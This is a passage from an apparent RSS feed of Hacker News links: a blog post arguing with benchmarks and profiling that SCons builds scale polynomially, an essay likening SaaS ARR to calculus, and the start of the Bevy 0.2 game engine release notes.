<tr>
<th>Python</th>
<td>2.7.3 (system default)</td>
<td>2.6.2</td>
</tr>
</tbody></table>
<p>
Before running the tests, I rebooted the system to ensure there were no rogue processes consuming memory or CPU.  I also forced the CPU cores into “performance” mode to ensure that they ran at their full 1.7GHz speed, rather than at the lower 933MHz they switch to when idle.</p>
<h3>Revisiting the original benchmark</h3>
<p>
I think Dirk had two credible theories to explain the results I obtained in my original tests.  First, Dirk wondered if those results may have been the result of <i>virtual memory swapping</i> — my original test system had relatively little RAM, and SCons itself uses a lot of memory.  It’s plausible that physical memory was exhausted, forcing the OS to swap memory to disk.  As Dirk said, “this would explain the increase of build times” — you bet it would!  I don’t remember seeing any indication of memory swapping when I ran these tests originally, but to be honest it was nearly 4 years ago and perhaps my memory is not reliable.  To eliminate this possibility, I ran the tests on a system with 16 GB RAM this time.  During the tests I ran <span><span face="Courier New">vmstat 5</span></span>, which collects memory and swap usage information at five second intervals, and captured the result in a log.</p>
<p>
Next, he suggested that I skewed the results by directing SCons to inherit the ambient environment, rather than using SCons’ default “sanitized” environment.  That is, he felt I should have used <span><span face="Courier New">env = Environment()</span></span> rather than <span><span face="Courier New">env = Environment(ENV = os.environ)</span></span>.  To ensure that this was not a factor, I modified the tests so that they did not inherit the environment.  At the same time, I substituted <span><span face="Courier New">echo</span></span> for the compiler and other commands, in order to make the tests faster.  Besides, I’m not interested in benchmarking the compiler — just SCons!  Here’s what my <span><span face="Courier New">Environment</span></span> declaration looks like now:</p>
<pre title="">env = Environment(CC = 'echo', AR = 'echo', RANLIB = 'echo')
</pre>
<p>With these changes in place I reran my benchmarks.  As expected, there was no change in the outcome.  There is no doubt:  <b>SCons does <i>not</i> scale linearly</b>.  Instead the growth is <i>polynomial</i>, following an n<sup>1.85</sup> curve.  And thanks to the the <a href="https://github.com/emelski/scons_bench/blob/master/logs/2.3.0/001/50000.vmstat">vmstat output</a> we can be certain that there was absolutely no swapping affecting the benchmarks.  Here’s a graph of the results, including an n<sup>1.85</sup> curve for comparison — notice that you can barely see that curve because it matches the observed data so well!</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_full.png"><img data-attachment-id="1040" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_full/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_full.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=640&amp;h=384" alt="SCons full build runtime - click for larger view" srcset="https://emelski.files.wordpress.com/2013/12/scons_full.png 500w, https://emelski.files.wordpress.com/2013/12/scons_full.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_full.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
For comparison, I used the SCons build log to make a shell script that executes the same series of <span><span face="Courier New">echo</span></span> commands.  At 50,000 targets, the shell script ran in 1.097s.  You read that right:  <b>1.097s</b>.  Granted, the shell script doesn’t do stuff like up-to-date checks, etc., but still — of the 3,759s average SCons runtime, 3,758s — 99.97% — is SCons overhead.</p>
<p>
I also created a non-recursive Makefile that “builds” the same targets with the same <span><span face="Courier New">echo</span></span> commands.  This is a more realistic comparison to SCons — after all, nobody would dream of actually controlling a build with a straight-line shell script, but lots of people would use GNU make to do it.  With 50,000 targets, GNU make ran for <b>82.469s</b> — more than 45 times faster than SCons.</p>
<h3>What is linear scaling?</h3>
<p>
If the performance problems are so obvious, why did Dirk fail to see them?  Here’s a graph made from his test results:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_baechle.png"><img data-attachment-id="1038" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_baechle/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime, via D. Baechle" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=640&amp;h=640" alt="SCons full build runtime, via D. Baechle - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_baechle.png 500w, https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
Dirk says that this <a href="http://scons.org/wiki/WhySconsIsNotSlow#Linear_scaling">demonstrates “SCons’ linear scaling”</a>.  I find this statement baffling, because his data clearly shows that <i>SCons does not scale linearly</i>.  It’s simple, really:  <i>linear scaling</i> just means that the build time increases by the same amount for each new target you add, regardless of how many targets you already have.  Put another way, it means that the difference in build time between 1,000 targets and 2,000 targets is <i>exactly the same</i> as the difference between 10,000 and 11,000 targets, or between 30,000 and 31,000 targets.  Or, put yet another way, it means that when you plot the build time versus the number of targets, you should get a straight line with <i>no change in slope at any point</i>.  Now you tell me:  does that describe Dirk’s graph?</p>
<p>
Here’s another version of that graph, this time augmented with a couple additional lines that show what the plot would look like if SCons were truly scaling linearly.  The first projection is based on the original graph from 2,500 to 4,500 targets — that is, if we assume that SCons scales linearly and that the increase in build time between 2,500 and 4,500 targets is representative of the cost to add 2,000 more targets, then this line shows us how we should expect the build time to increase.  Similarly, the second projection is based on the original graph between 4,500 and 8,500 targets.  You can easily see that the actual data does not match either projection.  Furthermore you can see that the slope of these projections is <i>increasing</i>:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png"><img data-attachment-id="1039" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_baechle_augmented/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime with linear projections, via D. Baechle" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=640&amp;h=640" alt="SCons full build runtime with linear projections, via D. Baechle - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png 500w, https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
This shows the importance of testing at large scale when you’re trying to characterize the scalability of a system from empirical data.  It can be difficult to differentiate polynomial from logarithmic or linear at low scales, especially once you incorporate the constant factors — polynomial algorithms can sometimes even give <i>better</i> absolute performance for small inputs than linear algorithms!  It’s not until you plot enough data points at large enough values, as I’ve done, that it becomes easy to see and identify the curve.</p>
<h3>What does profiling tell us?</h3>
<p>
Next, Dirk reran some of his tests under a profiler, on the very reasonable assumption that if there was a performance problem to be found, it would manifest in the profiling data — surely at least one function would demonstrate a larger-than-expected growth in runtime.  Dirk only shared profiling data for two runs, both incremental builds, at 8,500 and 16,500 targets.  That’s unfortunate for a couple reasons.  First, the performance problem is less apparent on incremental builds than on full builds.  Second, with only two datapoints it is literally not possible to determine whether growth is linear or polynomial.  The results of Dirk’s profiling was negative:  he found no “significant difference or increase” in any function.</p>
<p>
Fortunately it’s easy to run this experiment myself.  Dirk used <a href="http://docs.python.org/2/library/profile.html">cProfile</a>, which is built-in to Python.  To profile a Python script you can inject cProfile from the command-line, like this: <span><span face="Courier New">python -m cProfile scons</span></span>.  Just before Python exits, cProfile dumps timing data for every function invoked during the run.  I ran several full builds with the profiler enabled, from 2,000 to 20,000 targets.  Then I sorted the profiling data by function internal time (time spent in the function exclusively, not in its descendents).  <i>In every run</i>, the same two functions appeared at the top of the list:  <span><span face="Courier New">posix.waitpid</span></span> and <span><span face="Courier New">posix.fork</span></span>.  To be honest this was a surprise to me — previously I believed the problem was in SCons’ Taskmaster implementation.  But I can’t really argue with the data.  It makes sense that SCons would spend most of its time running and waiting for child processes to execute, and even that the amount of time spent in these functions would increase as the number of child processes increases.  But look at the growth in runtimes in these two functions:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_profiler.png"><img data-attachment-id="1041" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_profiler/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build function time, top two functions" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=640&amp;h=640" alt="SCons full build function time, top two functions - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_profiler.png 500w, https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
Like the overall build time, these curves are obviously non-linear.  Armed with this knowledge, I went back to Dirk’s profiling data.  To my surprise, <i>posix.waitpid and posix.fork don’t even appear in Dirk’s data</i>.  On closer inspection, his data seems to include only a subset of all functions — about 600 functions, whereas <a href="https://github.com/emelski/scons_bench/blob/master/logs/2.3.0_profiling/001/20000.prof">my profiling data</a> contains more than 1,500.  I cannot explain this — perhaps Dirk filtered the results to exclude functions that are part of the Python library, assuming that the problem must be in SCons’ own code rather than in the library on which it is built.</p>
<p>
This demonstrates a second fundamental principle of performance analysis:  make sure that you consider <i>all</i> the data.  Programmers’ intuition about performance problems is notoriously bad — even mine! — which is why it’s important to measure before acting.  But measuring won’t help if you’re missing critical data or if you discard part of the data before doing any analysis.</p>
<h3>Conclusions</h3>
<p>
On the surface, performance analysis seems like it should be simple:  start a timer, run some code, stop the timer.  Done correctly, performance analysis can illuminate the dark corners of your application’s performance.  Done incorrectly — and there are <i>many</i> ways to do it incorrectly — it can lead you on a wild goose chase and cause you to squander resources fixing the wrong problems.</p>
<p>
Dirk Baechle had good intentions when he set out to analyze SCons performance, but he made some mistakes in his process that led him to an erroneous conclusion.  First, he didn’t run enough …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/">https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/</a></em></p>]]>
            </description>
            <link>https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530845</guid>
            <pubDate>Sat, 19 Sep 2020 22:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculus in SaaS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530760">thread link</a>) | @Lukas1994
<br/>
September 19, 2020 | https://www.causal.app/blog/calculus-in-saas | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/calculus-in-saas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a>‍</p><p>I have been studying the SaaS model in depth for almost 7 years now. Since the day <a href="https://alexoppenheimer.substack.com/p/harry-2d5d1af6bf">Harry Weller</a> walked into my office with a stack of materials and told me to study it and then SaaS build models and bring them to portfolio companies, I don't think a day has gone by where I have not thought about the conceptual and operational nuances of the recurring revenue business model.</p><p>Somewhere around mid 2015 I had my "aha" moment in my research when I tied my academic training in mechanical engineering to the startup business models I was building: it's all calculus. The integral-derivative relationship applies incredibly well to the ARR and Recognized Revenue relationship. Making this connection between engineering math and financial math gave me a feeling that only a true nerd could appreciate: the joy of putting integral symbols and accounting terms on the same slide.</p><p>The simplest way to illustrate this mathematical parallel is with a car:</p><figure id="w-node-2abd43418357-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b33c9e3271323643b3d_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F42d5ef92-52d9-49fe-8be7-16028bee1ff4_884x306.png" alt=""></p></figure><p>If a car is moving at 60mph, then in one hour it will travel 60 miles (assuming its speed does not change). That is the definition of "miles per hour." ARR is very similar: if a company is "moving" at $10M ARR, then in one year it will recognize $10M of revenue (assuming everything stays consistent). Recognized revenue is the distance, ARR is the speed. It's critical to recognize that ARR is a rate at a specific point in time used to imply something (here, expected recognized revenue in the future period).</p><p>For the more accounting oriented, another analogy can be made to the balance sheet:</p><figure id="w-node-9fc87f218c80-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b3392b0138c4e64006b_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F6c06ddcc-de3e-4d96-960a-22b4b39e334e_842x455.png" alt=""></p></figure><p>While revenue is the top line metric on the income statement, ARR works more like a balance sheet metric: it is taken at a single point in time rather than over a period of time. This can make income statements confusing and misaligned - another example of the divergence of accounting in economics in subscription businesses.</p><p>Now back to calculus... if the ARR function was actually a mathematical equation, you could integrate it. If y = 10x where y = ARR and x = time in months, then after two months ARR = $20. After 12 months, ARR = $120 (assuming we start from $0 of ARR). So at the end of a year, the business has grown from $0 to $120 in ARR. But what is the recognized revenue? The complex answer is that it's the integral of 10x from 0 to 12 months. (Apologies in advance if this triggers a high school calculus flashback.)</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b337d3c7911d7362b81_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Ff7fcb57f-644b-490c-bfa8-6d0c986d2fda_305x80.png" alt=""></p></figure><p>You could also chart this out and see that it is a right triangle with the area of 1/2*base*height. Where the base is 12 months and the height is $120: $1,440/2 = $720).</p><p>Pretty cool relationship and calculation conceptually, but in real businesses ARR growth doesn't fit a simple equation (or any equation at all), so it's not inherently practical to start breaking out the power rule and your old textbooks to predict ARR growth.</p><p>If we switch back to the car analogy, it takes on a little more of a nuanced meaning. Just like a business doesn't grow on a smooth curve, car speeds do not either. Just like the gas pedal makes the car go faster and the brake pedal &amp; friction make it go slower, so too in a SaaS company, <a href="https://alexoppenheimer.substack.com/p/thin-slicing-arr">the new sales are making the speed/ARR increase and the churned customers are making the speed/ARR decrease</a>. I will dive into more details in later posts, but the goal in a car is to go as far and fast as you can while burning the least amount of fuel. So too in a SaaS company, the goal is to have the highest ARR you can, recognize the most revenue and burn the least cash. You can think about SaaS Magic Number like the fuel efficiency of a SaaS business - looking forward to diving into why this is actually helpful in building a company.</p></div></div>]]>
            </description>
            <link>https://www.causal.app/blog/calculus-in-saas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530760</guid>
            <pubDate>Sat, 19 Sep 2020 22:33:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bevy 0.2]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24530698">thread link</a>) | @_cart
<br/>
September 19, 2020 | https://bevyengine.org/news/bevy-0-2/ | <a href="https://web.archive.org/web/*/https://bevyengine.org/news/bevy-0-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><img src="https://bevyengine.org/news/bevy-0-2/matching_squares.png"></p>
      
    
  </div><div><p>A month after the initial Bevy release, and thanks to <strong>87</strong> contributors, <strong>174</strong> pull requests, and our <a href="https://github.com/sponsors/cart"><strong>generous sponsors</strong></a>, I'm happy to announce the <strong>Bevy 0.2</strong> release on <a href="https://crates.io/crates/bevy">crates.io</a>!</p>
<p>For those who don't know, Bevy is a refreshingly simple data-driven game engine built in Rust. You can check out <a href="https://bevyengine.org/learn/book/getting-started/">Quick Start Guide</a> to get started. Bevy is also free and open source forever! You can grab the full <a href="https://github.com/bevyengine/bevy">source code</a> on GitHub.</p>
<p>Here are some of the highlights from this release:</p>
<h2 id="async-task-system">Async Task System</h2>

<p>Bevy uses multi-threading throughout the engine: ECS scheduling, asset loading, rendering, etc. Before this release it used <a href="https://github.com/rayon-rs/rayon">Rayon</a> for almost all of these tasks. Rayon is nice because it is generally as simple as calling <code>some_list.par_iter().for_each(|x| do_something(x))</code>. Rayon then automatically breaks the <code>for_each</code> into tasks and runs them on as many cores as it can. Rayon is a great choice if you want to easily parallelize code, but it has the downside of being pretty cpu-hungry.</p>
<p>Bevy (and a number of other rust game engines and ecs frameworks using rayon) have received feedback that they were overly cpu hungry / usage was not proportional to "real" work done.</p>
<p>We decided to resolve this problem by building a custom async-friendly task system, which enables the creation of context-specific task pools. For example, you might have separate pools for compute, IO, networking, etc. This also gives us the flexibility to load balance work appropriately according to work type and/or priority. The cpu usage wins have been huge:</p>
<h3 id="total-combined-percent-cpu-usage-8-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 8 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_1.svg" alt="threading cpu usage 8 core"></p>
<h3 id="total-combined-percent-cpu-usage-32-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 32 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_2.svg" alt="threading cpu usage 32 core"></p>
<h2 id="initial-web-platform-support">Initial Web Platform Support</h2>
<p>authors: @smokku</p>
<p>(A subset of) Bevy now runs on the web using WebAssembly/WASM! Specifically, Bevy apps can run Bevy ECS schedules, react to input events, create an empty canvas (using winit), and a few other things. This is a huge first step, but it is important to call out that there are still a number of missing pieces, such as 2D/3D rendering, multi-threading, and sound. </p>
<p>Those limitations haven't stopped @mrk-its from building the first WASM Bevy game!</p>
<h3 id="bevy-robbo-playable-here"><a href="https://github.com/mrk-its/bevy-robbo">bevy-robbo</a> (<a href="https://s3.eu-central-1.amazonaws.com/mrk-public/bevy-robbo/index.html">playable here</a>)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy-robbo.png" alt="bevy-robbo"></p>
<p>They use Bevy for game logic and cleverly work around the render limitations by passing ASCII art game state from <a href="https://github.com/mrk-its/bevy-robbo/blob/master/src/systems/js_render.rs">this Bevy system</a> to <a href="https://github.com/mrk-its/bevy-robbo/blob/master/assets/render.js">this JavaScript function</a>. </p>
<p>You can play around with some Bevy WASM examples by <a href="https://github.com/bevyengine/bevy/tree/master/examples#wasm">following the instructions here</a>.</p>
<h2 id="parallel-queries">Parallel Queries</h2>
<p>authors: @GrantMoyer</p>
<p>Bevy ECS Queries are a flexible way to retrieve data from the Entity Component System. Systems that <em>use</em> queries already run in parallel, but before this change the queries themselves could not be <em>iterated</em> in parallel. <strong>Bevy 0.2</strong> adds the ability to easily iterate queries in parallel:</p>
<pre><code><span>fn </span><span>system</span><span>(</span><span>pool</span><span>: </span><span>Res</span><span>&lt;</span><span>ComputeTaskPool</span><span>&gt;</span><span>, </span><span>mut </span><span>query</span><span>: </span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> Transform</span><span>&gt;) {</span><span>
    query</span><span>.</span><span>iter</span><span>().</span><span>par_iter</span><span>(</span><span>32</span><span>).</span><span>for_each</span><span>(&amp;</span><span>pool</span><span>, |</span><span>mut </span><span>transform</span><span>| {</span><span>
      transform</span><span>.</span><span>translate</span><span>(</span><span>Vec3</span><span>::</span><span>new</span><span>(</span><span>1.0</span><span>, </span><span>0.0</span><span>, </span><span>0.0</span><span>));
    });
}
</span></code></pre>
<p>This provides a nice functional api (similar to Rayon) that runs on top of the new <code>bevy_tasks</code> system. It breaks the query up into 32 "batches" and runs each batch as a different task in the bevy task system. </p>
<h2 id="transform-system-rewrite">Transform System Rewrite</h2>
<p>authors: @MarekLg</p>
<pre><code><span>// old
</span><span>fn </span><span>system</span><span>(</span><span>translation</span><span>: &amp;</span><span>Translation, </span><span>rotation</span><span>: &amp;</span><span>Rotation, </span><span>scale</span><span>: &amp;</span><span>Scale</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> translation</span><span>.</span><span>0</span><span>,</span><span> rotation</span><span>.</span><span>0</span><span>,</span><span> scale</span><span>.</span><span>0</span><span>);
}

</span><span>// new
</span><span>fn </span><span>system</span><span>(</span><span>transform</span><span>: &amp;</span><span>Transform</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> transform</span><span>.</span><span>translation</span><span>(),</span><span> transform</span><span>.</span><span>rotation</span><span>(),</span><span> transform</span><span>.</span><span>scale</span><span>());
}
</span></code></pre>
<p>Bevy's old transform system used separate <code>Translation</code>, <code>Rotation</code>, and <code>Scale</code> components as the "source of truth". Users modified with these components in their systems, after which they were synced to a <code>LocalTransform</code> component, which was in turn synced to a global <code>Transform</code> component, taking hierarchy into account. This was nice for a couple of reasons:</p>
<ul>
<li>Slightly more cache efficient to retrieve individual components like <code>Translation</code> (because less data needs to be accessed)</li>
<li>Theoretically more parallel-friendly. Systems that only access <code>Translation</code> won't block systems accessing <code>Rotation</code>.</li>
</ul>
<p>However this approach also has some pretty serious downsides:</p>
<ul>
<li>The "individual components" are the source of truth, so <code>LocalTransform</code> is out of date when user systems are running. If an up to date "full transform" is needed, it must be manually constructed by accessing all three components.</li>
<li>Very hard to reason about. There are 5 components users need to think about and they all interact with each other differently.</li>
<li>Setting a Transform to a specific matrix value (ex: <code>Mat4::look_at()</code>) was extremely cumbersome, and the value would be immediately overwritten unless the user explicitly disabled component syncing.</li>
</ul>
<p>Given these issues, we decided to move to a single unified local-to-parent <code>Transform</code> component as the source of truth, and a computed <code>GlobalTransform</code> component for world-space transforms. We think this api will be much easier to use and to reason about. <a href="https://gist.github.com/joeante/79d25ec3a0e86436e53eb74f3ac82c0c">Unity is also considering a similar Transform rework for their ECS</a> and a lot of discussion on this topic happened in this <a href="https://community.amethyst.rs/t/legion-transform-design-discussion">Amethyst Forum Thread</a>.</p>
<h2 id="joystick-gamepad-input">Joystick/Gamepad Input</h2>
<p>authors: @simpuid</p>
<p>The Bevy Input plugin now has cross-platform support for most controllers thanks to the <a href="https://gitlab.com/gilrs-project/gilrs">gilrs</a> library!</p>
<pre><code><span>fn </span><span>button_system</span><span>(</span><span>gamepads</span><span>: </span><span>Res</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Gamepad</span><span>&gt;&gt;</span><span>, </span><span>button_input</span><span>: </span><span>Res</span><span>&lt;</span><span>Input</span><span>&lt;</span><span>GamepadButton</span><span>&gt;&gt;) {
    </span><span>for</span><span> gamepad </span><span>in</span><span> gamepads</span><span>.</span><span>iter</span><span>() {
        </span><span>if</span><span> button_input</span><span>.</span><span>just_pressed</span><span>(</span><span>GamepadButton</span><span>(*</span><span>gamepad</span><span>, </span><span>GamepadButtonType</span><span>::</span><span>RightTrigger</span><span>)) {
            </span><span>println!</span><span>("</span><span>Pressed right trigger!</span><span>");
        }
    }
}
</span></code></pre><h2 id="bevy-ecs-performance-improvements">Bevy ECS Performance Improvements</h2>
<p>authors: @cart</p>
<h3 id="generational-entity-ids">Generational Entity IDs</h3>
<p>We changed Entity IDs from being random UUIDs to incrementing generational indices. Random UUIDs were nice because they could be created anywhere, were unique across game runs, and could be safely persisted to files or reused across networks. I was really hoping we could make them work, but they ended up being too slow relative to the alternatives. The randomness had a measurable cost and entity locations had to be looked up using a hash map.</p>
<p>By moving to generational indices (we use the hecs implementation), we can directly use entity ids as array indices, which makes entity location lookups lightning fast.</p>
<h3 id="read-only-queries">Read Only Queries</h3>
<p>I implemented "read only" traits for queries that don't mutate anything. This allows us to guarantee that a query won't mutate anything.</p>
<h3 id="removed-locking-from-world-apis">Removed locking from World apis</h3>
<p>This gives us a really nice speed boost. We can do this safely due to a combination of the new "read only queries" and changing World mutation apis to be a mutable World borrow.</p>
<p>This is not yet enabled for <code>Queries</code> in systems because a system could have multiple <code>Queries</code>, which could be simultaneously accessed in a way that doesn't make mutable access unique. I think thats a solve-able problem, but it will take a bit more work. Fortunately "for-each" systems don't have any collision risk, so we now use lock-less queries there.</p>
<h3 id="direct-component-lookup-in-nanoseconds-smaller-is-better">Direct component lookup (in nanoseconds, smaller is better)</h3>
<p>As a result of these optimizations, direct component lookup is <em>much</em> faster than it used to be:</p>
<p><img src="https://bevyengine.org/news/bevy-0-2/get_component.svg" alt="get_component graph"></p>
<p>Note that this benchmark used <code>world.get::&lt;T&gt;(entity)</code>. <code>query.get::&lt;T&gt;(entity)</code> should have results similar to the <code>hecs</code> results because it still uses a lock. Eventually I'm hoping that we can remove locks from system queries too.</p>
<h2 id="change-log">Change Log</h2>
<h3 id="added">Added</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/384">Task System for Bevy</a>
<ul>
<li>Replaces rayon with a custom designed task system that consists of several "TaskPools".</li>
<li>Exports <code>IOTaskPool</code>, <code>ComputePool</code>, and <code>AsyncComputePool</code> in <code>bevy_tasks</code> crate.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/292">Parallel queries for distributing work over with the <code>ParallelIterator</code> trait.</a>
<ul>
<li>e.g. <code>query.iter().par_iter(batch_size).for_each(/* ... */)</code></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/280">Added gamepad support using Gilrs</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/503">Implement WASM support for bevy_winit</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/506">Create winit canvas under WebAssembly</a> </li>
<li><a href="https://github.com/bevyengine/bevy/pull/496">Implement single threaded task scheduler for WebAssembly</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/271">Support for binary glTF (.glb).</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/358">Support for <code>Or</code> in ECS queries.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/339">Added methods <code>unload()</code> and <code>unload_sync()</code> on <code>SceneSpawner</code> for unloading scenes.</a>.</li>
<li><a href="https://github.com/bevyengine/bevy/pull/145">Custom rodio source for audio.</a>
<ul>
<li><code>AudioOuput</code> is now able to play anything <code>Decodable</code>.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/362"><code>Color::hex</code></a> for creating <code>Color</code> from string hex values.
<ul>
<li>Accepts the forms RGB, RGBA, RRGGBB, and RRGGBBAA.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/381"><code>Color::rgb_u8</code> and <code>Color::rgba_u8</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/396">Added <code>bevy_render::pass::ClearColor</code> to prelude.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/430"><code>SpriteResizeMode</code> may choose how <code>Sprite</code> resizing should be handled. <code>Automatic</code> by default.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/428">Added methods on <code>Input&lt;T&gt;</code></a> for iterator access to keys.
<ul>
<li><code>get_pressed()</code>, <code>get_just_pressed()</code>, <code>get_just_released()</code></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/270">Derived <code>Copy</code> for <code>MouseScrollUnit</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/390">Derived <code>Clone</code> for UI component bundles.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/332">Some examples of documentation</a></li>
